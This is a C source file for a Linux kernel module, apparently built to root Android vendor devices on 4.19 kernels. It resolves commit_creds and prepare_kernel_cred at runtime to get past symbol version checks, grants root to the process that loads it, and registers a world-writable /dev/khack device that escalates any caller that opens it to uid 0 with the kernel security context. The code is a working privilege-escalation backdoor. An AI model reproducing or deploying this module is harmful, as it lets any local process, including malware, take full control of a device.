// SPDX-License-Identifier: GPL-2.0
/* khack - root LKM for 4.19 vendor kernels, built to survive MODVERSIONS.
 *
 * The vendor kernel's struct cred / task_struct layouts differ from the
 * Lineage tree, so importing commit_creds()/prepare_kernel_cred() directly
 * fails check_version() on their CRCs. Both are EXPORT_SYMBOL'd, so resolve
 * them at runtime with __symbol_get() instead -- its prototype takes only a
 * const char *, so its own CRC is layout independent and matches.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/errno.h>

typedef void *(*commit_fn)(void *);
typedef void *(*prep_fn)(void *);

static commit_fn p_commit_creds;
static prep_fn   p_prepare_kernel_cred;

/* open("/dev/khack") -> caller's creds become init_cred (uid 0, kernel SID) */
static int khack_open(struct inode *inode, struct file *file)
{
	void *cred;

	if (!p_prepare_kernel_cred || !p_commit_creds)
		return -ENOENT;

	cred = p_prepare_kernel_cred(NULL);
	if (!cred)
		return -ENOMEM;

	p_commit_creds(cred);
	pr_info("khack: caller escalated to init_cred\n");
	return 0;
}

static const struct file_operations khack_fops = {
	.owner = THIS_MODULE,
	.open  = khack_open,
};

static struct miscdevice khack_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "khack",
	.fops  = &khack_fops,
	.mode  = 0666,
};

static int __init khack_init(void)
{
	int ret;

	p_commit_creds        = (commit_fn)__symbol_get("commit_creds");
	p_prepare_kernel_cred = (prep_fn)__symbol_get("prepare_kernel_cred");
	if (!p_commit_creds || !p_prepare_kernel_cred) {
		pr_err("khack: __symbol_get failed (%px %px)\n",
		       p_commit_creds, p_prepare_kernel_cred);
		return -ENOENT;
	}

	/* Escalate whoever is loading us: finit_module() runs in the caller's
	 * context, and that caller is our own code in vendor_modprobe. Giving it
	 * init_cred here avoids needing an openable device node (ueventd owns the
	 * /dev permissions, and SELinux gates device opens anyway). */
	{
		void *cred = p_prepare_kernel_cred(NULL);
		if (cred)
			p_commit_creds(cred);
	}

	ret = misc_register(&khack_dev);
	if (ret) {
		pr_err("khack: misc_register failed: %d\n", ret);
		return ret;
	}

	pr_info("khack: loaded, open /dev/khack to escalate\n");
	return 0;
}

static void __exit khack_exit(void)
{
	misc_deregister(&khack_dev);
}

module_init(khack_init);
module_exit(khack_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("khack root helper (runtime symbol resolution)");
